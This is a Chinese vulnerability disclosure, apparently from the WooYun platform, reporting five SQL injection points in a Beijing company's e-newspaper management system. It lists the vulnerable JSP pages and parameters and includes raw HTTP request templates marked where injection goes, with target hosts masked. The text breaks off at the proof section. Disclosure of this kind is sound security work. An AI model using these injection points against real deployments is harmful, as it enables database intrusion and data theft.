wybug_title: 某电子报管理系统5处sql注入打包
wybug_corp: 北京紫新报通科技发展有限公司
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-04：	细节已通知厂商并且等待厂商处理中									2015-07-06：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-07-09：	细节向第三方安全合作伙伴开放									2015-08-30：	细节向核心白帽子及相关领域专家公开									2015-09-09：	细节向普通白帽子公开									2015-09-19：	细节向实习白帽子公开									2015-10-04：	细节向公众公开  简要描述： 某电子报管理系统'5'处sql注入打包 详细说明：  北京紫新报通某个注入点，存在四处注入漏洞注入点：
第1处：/epaper/test/login_check.jsp  username第2处： /epaper/test/regist.jsp?dowhat=registsave 第3处：/epaper/test/comments_add.jsp GET方式的COMMENT_ID第4处： /epaper/test/comments_add.jsp POST方式的clubuser第5处：/epaper/web/getpassdo.jsp[见测试代码]
POC见测试代码附上要求的案例5个：http://**.**.**.**:10000/http://**.**.**.**/http://**.**.**.**:81/http://**.**.**.**/http://**.**.**.**/第一处：直接访问http://**.**.**.**/epaper/test/login.jsp
POST /epaper/test/login_check.jsp HTTP/1.1Host: **.**.**.**:8080Proxy-Connection: keep-aliveContent-Length: 114Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**:8080/epaper/test/login.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=25FDEBEA92ADEA0151AA129A892185A6; JSESSIONID=7DB4481A866BFDAD91FC4152D6CB2F1Busername=admin[////inject here////]&password=aaaaa&Submit=%B5%C7+%C2%BC
第二处：直接访问http://**.**.**.**/epaper/test/regist.jsp
POST /epaper/test/regist.jsp?dowhat=registsave HTTP/1.1Host: **.**.**.**:8080Proxy-Connection: keep-aliveContent-Length: 211Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**:8080/epaper/test/regist.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=25FDEBEA92ADEA0151AA129A892185A6; JSESSIONID=7DB4481A866BFDAD91FC4152D6CB2F1Busername=admin[////inject here////]&password=123123&password2=123123&email=adasd%**.**.**.**&realname=aaaa&sex=radiobutton&cardnumber=11111111&birthday=&telephone=&fax=&handphone=&address=&postcode=&workdept=&duty=&Submit=%D7%A2+%B2%E1
第三处：直接访问：http://**.**.**.**/epaper/comments/comments_add.jsp?contentid=[////inject here////]//POC见测试代码第四处：直接访问http://**.**.**.**/epaper/comments/comments_add.jsp抓包：
POST /epaper/comments/comments_add.jsp?dowhat=addsave HTTP/1.1Host: **.**.**.**:10000Proxy-Connection: keep-aliveContent-Length: 87Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**:10000User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**:10000/epaper/comments/comments_add.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=2B308A0B510C11328BBBA06C9CB6084E; JSESSIONID=668E2630FB5E5A6F5C8B5FADC80A1F56; ASPSESSIONIDSADDRAAA=FGLHLLOBAECEFFKMLGDOMLAM; AJSTAT_ok_times=1papername=&pubdate=&pagename=&contentid=&title=&clubuser=admin[////inject here////]&password=123123&content=
第五处：（PS：这处功能似乎很多网站都没开启，不过还是有开启的，见测试代码）直接访问http://**.**.**.**/epaper/web/getpassdo.jsp?username=   漏洞证明：  第1处
